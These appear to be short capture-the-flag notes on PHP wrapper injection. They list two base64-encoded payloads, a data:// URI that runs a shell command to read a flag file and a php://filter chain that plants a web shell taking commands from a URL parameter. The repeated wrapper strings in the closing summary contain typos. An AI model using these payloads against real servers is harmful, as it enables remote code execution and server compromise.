
Payload which worked to read flags/flag.txt
**data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZ3MvY2QzYzY3ZTUwNzlkZTI3MDBhZjZjZWEwYTQwNWY5Y2MudHh0Iik7ID8+**

Payload which worked for earlier tasks but not for reading flags/flag.txt
[**`php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+](php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydwd2QnXSk7IGVjaG8gJ1NoZWxsIGRvbmUhJzsgPz4K)`**

The base64-encoded string has been working fine in above payload with various commands e.g
1. pwd 
2. ls flags/

**Description of use for the payloads**
So there are 2 payloads available to use when injecting PHP code using the PHP wrappers. For some reason depending on the code being sent to the webapp, sometimes the backend fails to execute the base64 encoded payload dependant on the wrapper being used. 


#### **The 2 payload methods**

**This payload works for reading the flag**
data://text/plin;base64,  

**works for general RCE commands but not for reading the flag.**
hp://filter/convert.base64-decode/resource=data://plain/text, 




